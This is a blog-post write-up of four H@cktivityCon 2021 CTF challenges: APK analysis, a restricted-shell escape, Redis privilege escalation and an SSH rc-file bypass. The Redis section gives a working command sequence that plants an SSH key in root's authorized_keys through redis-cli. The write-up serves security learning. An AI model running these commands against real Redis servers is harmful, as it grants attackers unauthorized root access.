<!doctype html><html lang=en><head><title>H@cktivityCon 2021 CTF Writeup ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/hacktivitycon-2021-ctf/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/hacktivitycon-2021/hacktivity.jpeg"><meta name=twitter:title content="H@cktivityCon 2021 CTF Writeup"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="H@cktivityCon 2021 CTF Writeup"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/hacktivitycon-2021-ctf/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2021-09-18 00:00:00 +0000 UTC"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/hacktivitycon-2021-ctf/>H@cktivityCon 2021 CTF Writeup</a></h1><div class=post-meta><time class=post-date>2021-09-18 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/ctf/>CTF</a>&nbsp;</span><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#challenges>Challenges</a><ul><li><a href=#1-mobile-to-do>1. Mobile: To Do</a></li><li><a href=#2-miscellaneous-shelle>2. Miscellaneous: Shelle</a></li><li><a href=#3-miscellaneous-redlike>3. Miscellaneous: Redlike</a></li><li><a href=#4-miscellaneous-race-car>4. Miscellaneous: Race Car</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><div class=post-content><div><img src=/img/hacktivitycon-2021/hacktivity.jpeg class=center style=border-radius:8px><h2 id=introduction>Introduction<a href=#introduction class=hanchor arialabel=Anchor>&#8983;</a></h2><p>H@cktivityCon 2021 was happening over the weekend and I participated in their ctf with team <a href=https://twitter.com/fr334aks target=_blank rel=noopener>@fr334aks</a>
. We managed position 49 out of 2527 teams.
This writeup is of the challenges I managed to solve.</p><h2 id=challenges>Challenges<a href=#challenges class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=1-mobile-to-do>1. Mobile: To Do<a href=#1-mobile-to-do class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Challenge Description:</p><img src=/img/hacktivitycon-2021/to-do-1.png class=center style=border-radius:8px><p>We are provided with an apk file. First thing I typically do with apk files is open them with jadx-gui.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>jadx-gui todo.apk
</span></span></code></pre></div><p>Here I first look at the AndroidManifest.xml to see the application entry point.</p><img src=/img/hacktivitycon-2021/to-do-2.png class=center style=border-radius:8px><p>For this app it&rsquo;s LoginActivity. It checks if the input provided is equal to <code>testtest</code> and if true it goes on to load MainActivity.</p><img src=/img/hacktivitycon-2021/to-do-3.png class=center style=border-radius:8px><p>When we install the application and supply the password as <code>testtest</code> we get the flag.</p><img src=/img/hacktivitycon-2021/to-do-5.png class=center style=border-radius:8px>
<img src=/img/hacktivitycon-2021/to-do-6.png class=center style=border-radius:8px><p>Unfortunately I couldn&rsquo;t copy it out and typing it would have been a pain. Back on the MainActivity we see it loads MyDatabase.</p><img src=/img/hacktivitycon-2021/to-do-4.png class=center style=border-radius:8px><p>When we look at MyDatabase, it loads an sqlite database <code>todos.db</code>. A lot of the times sqlitedb database in android apps are stored within
the apk.</p><img src=/img/hacktivitycon-2021/to-do-7.png class=center style=border-radius:8px><p>Extracting the apk using apktool I was able to access the sqlitedb and extract the flag.</p><img src=/img/hacktivitycon-2021/to-do-8.png class=center style=border-radius:8px><h3 id=2-miscellaneous-shelle>2. Miscellaneous: Shelle<a href=#2-miscellaneous-shelle class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Challenge Description:</p><img src=/img/hacktivitycon-2021/shelle-1.png class=center style=border-radius:8px><p>When we connect to the challenge, we get access to a restricted shell with only a few commands we can run.</p><img src=/img/hacktivitycon-2021/shelle-2.png class=center style=border-radius:8px><p>When we read the assignment, we are told the flag is in the /opt directory.</p><img src=/img/hacktivitycon-2021/shelle-3.png class=center style=border-radius:8px><p>Unfortunately we can&rsquo;t access it.</p><img src=/img/hacktivitycon-2021/shelle-4.png class=center style=border-radius:8px><p>Next I tried to see if we can access any environment variables and see if the <code>$</code> character is forbidden as well.
Luckily this works.</p><img src=/img/hacktivitycon-2021/shelle-5.png class=center style=border-radius:8px><p>I then ran <code>set</code> to list all environment variables. Looking through the list I saw one set to bash.</p><img src=/img/hacktivitycon-2021/shelle-6.png class=center style=border-radius:8px><p>I was able to use it to escape the restricted shell and read the flag.</p><img src=/img/hacktivitycon-2021/shelle-7.png class=center style=border-radius:8px><h3 id=3-miscellaneous-redlike>3. Miscellaneous: Redlike<a href=#3-miscellaneous-redlike class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Challenge Description:</p><img src=/img/hacktivitycon-2021/redlike-1.png class=center style=border-radius:8px><p>After sshing into the challenge machine, I performed some local enumeration and when checking for running processes
we see redis running locally as root. Clearly this is the privesc path.</p><img src=/img/hacktivitycon-2021/redlike-2.png class=center style=border-radius:8px><p>I immediately jumped to <a href=https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh target=_blank rel=noopener>hacktricks</a>
and used the below commands to escalate privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ssh-keygen -f redis
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>echo -e <span style=color:#e6db74>&#34;\n\n&#34;</span>; cat redis.pub; echo -e <span style=color:#e6db74>&#34;\n\n&#34;</span><span style=color:#f92672>)</span> &gt; spaced_key.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cat spaced_key.txt | redis-cli -h 127.0.0.1 -x set ssh_key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>redis-cli -h 127.0.0.1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>config set dir /root/.ssh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>config set dbfilename <span style=color:#e6db74>&#34;authorized_keys&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>save
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> redis
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ssh -i redis root@127.0.0.1
</span></span></code></pre></div><img src=/img/hacktivitycon-2021/redlike-3.png class=center style=border-radius:8px><h3 id=4-miscellaneous-race-car>4. Miscellaneous: Race Car<a href=#4-miscellaneous-race-car class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Challenge Description:</p><img src=/img/hacktivitycon-2021/racecar-1.png class=center style=border-radius:8px><p>I enjoyed this one as I was the second to solve it.</p><p>When we ssh into the challenge machine, the session is immediately closed when we provide the password.</p><img src=/img/hacktivitycon-2021/racecar-2.png class=center style=border-radius:8px><p>I tried different techniques I knew for restricted shell bypass with ssh but none worked. I got an idea to use sftp and
see what configuration files could be causing this behaviour.</p><p>With sftp we are not kicked out and can look at files. Two files seem to be of interest but only <code>rc</code> in .ssh has contents.</p><img src=/img/hacktivitycon-2021/racecar-3.png class=center style=border-radius:8px><p>The rc file is the one responsible for getting us kicked out. I tried deleting it but that didn&rsquo;t work. However, since we have write
permissions, I was able to overwrite it by uploading an empty file with the same name.</p><p>Once that was done we can ssh and get the flag.</p><img src=/img/hacktivitycon-2021/racecar-4.png class=center style=border-radius:8px><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Thanks HackerOne, John Hammond and the CTF challenge creators, it was a fun one!</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/><span class=button__icon>←</span>
<span class=button__text>AfricaHackon 2021 CTF Finals WriteUp</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/package_managers_privesc/><span class=button__text>Linux Privilege Escalation - Package Managers</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>